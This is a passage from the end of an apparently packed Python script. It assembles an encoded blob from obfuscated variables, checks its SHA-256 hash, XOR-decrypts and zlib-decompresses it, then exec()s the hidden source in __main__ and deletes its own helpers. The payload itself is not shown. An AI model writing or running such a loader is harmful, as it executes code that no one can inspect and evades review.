+ _cfJPEkJS8h_C3y + _chlPls5M8Kclyn + _ccz6edpZwoLUEW + _cc_bnO6t3UHnm6 + _ckViz5fwVKQbKi + _ck5FK2lqfYY0QH + _czfuQnYjizOW77 + _cbjqssrWgAiEmn + _ciJ5lowXdzBTUl + _c_rJjqNRzzwo0P + _cqQd0eC1bLpKcv + _cn9JgxfwPrJaua + _cyAGwVF1noRgcY + _ck47jUO2TpSRib + _cohNSDhVCOLiXL + _cqof3PeAiBTmxa + _cv6F4cqf7EgIa0 + _c_S0CnXUu9WRex + _cvhMOR2qI5lUDz + _cx9H6eWG94zMLq + _cf5PeEWfeRXHUx + _cppGBluxJjoJa9 + _cpVHibF2TMEeUq + _cvosEbNcXirpxG + _cvd_Ks4A_lFnXm + _cn0xyaec2IVb63 + _ccBT66IKeooyeq + _c_rK9zoAdCbqE6 + _chPseuSaqqSK0h + _cyAXot8PtwrYk3 + _czsnqjOPl9_MiY + _cjwLrNjAP_eGXP + _ctRAOnD8xJ2Z_p + _cuwWSaePW8zYps + _c_Y2c3Of13voHQ + _cxyzThfA5RiZm_ + _cz2mKW33bsg2HC + _c_BoejpFZBOC6P + _cgsKsxGK1iwLhv + _cjvbxVJopHW5Jk + _cmOaTZc5meddT3 + _c_nEKsQl6m1WlO + _cb8FiHOd2oIoZr + _cfkOdVxw42ImYA + _c_mGzeq4ncnP1J + _clCINNxU1UZ4BY + _cjp0KQPD3NGZ5y + _c_yAc0S0T9BL27 + _cviNlXKu75o932 + _cvJ3npJJ9H_s2D + _cjM8HlqveYHWUB + _clThMV4oJctvUO + _cjsmxvygauQBvM + _cowqdQppcB1GHX + _cxqI02ZO2MO14R + _cjA4NZ8a5JjCNM + _crHrYoP5HBZ0dJ + _caffhSgcz2Ynh5 + _c_FIu2SEyPTJag + _cdZydIZ5W9Y87Q + _ceaF86UYeUMfID + _ccUk1te_3We94X + _chnLvXw0qy4YVL + _cpbFsgXNsYPlMj + _ct7WRQvEE10GUm + _cpIEviJy771ui5 + _clIbwIUl4UnRf0 + _circmVpOcDsKTd + _cpJ4q5axPe23pc + _cs0SzZHcoHUOHQ + _cp4kc_zDK6j8mq + _ctK58lS0n1Lu_C + _ciJxhRv1zNzXQu + _ch6I12UYMqg3QX)
if __import__('hashlib').sha256(_pff_TyND8jgmXm).hexdigest() != '5999d0d8e167231d6c0b3d4fcc45da32297f6eb8c750b5db5551c5aa79ccaedf':
    __import__('sys').exit(1)
_xrROlO4MyZL0tI = bytes([175, 170, 172, 69, 174, 69, 209, 41, 168, 247, 171])
_fkzGIgu3BN9S4K2 = bytes([134, 71, 203, 60, 163, 167, 254, 224, 141, 19, 240])

def _fxmvbXs5nBINDaI(_bjLMXXxNjrbn2I, _kyKQPAgZmjHj7n):
    return bytes(_bjLMXXxNjrbn2I[_ii2HxYLXw8dXg5] ^ _kyKQPAgZmjHj7n[_ii2HxYLXw8dXg5 % len(_kyKQPAgZmjHj7n)] for _ii2HxYLXw8dXg5 in range(len(_bjLMXXxNjrbn2I)))

def _fdguE9hP_zco5Hm(_tbUmaWUR6p5zRk):
    import zlib
    return zlib.decompress(_tbUmaWUR6p5zRk) # Un seul niveau de zlib ici pour simplifier

def _feca_LXxDnXzxnJ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xhG2sMUG8VO_w9 = _fxmvbXs5nBINDaI(_pff_TyND8jgmXm, _xrROlO4MyZL0tI)
    # 2. Décompression Zlib
    _dnwQLt2rB1tSWG = _fdguE9hP_zco5Hm(_xhG2sMUG8VO_w9)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dnwQLt2rB1tSWG.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nvAzLUcXxKAlwi = _main.__dict__
    _nvAzLUcXxKAlwi.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nvAzLUcXxKAlwi)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feca_LXxDnXzxnJ()
try:
    del _fxmvbXs5nBINDaI, _fdguE9hP_zco5Hm, _feca_LXxDnXzxnJ
    del _pff_TyND8jgmXm, _xrROlO4MyZL0tI, _fkzGIgu3BN9S4K2
except:
    pass
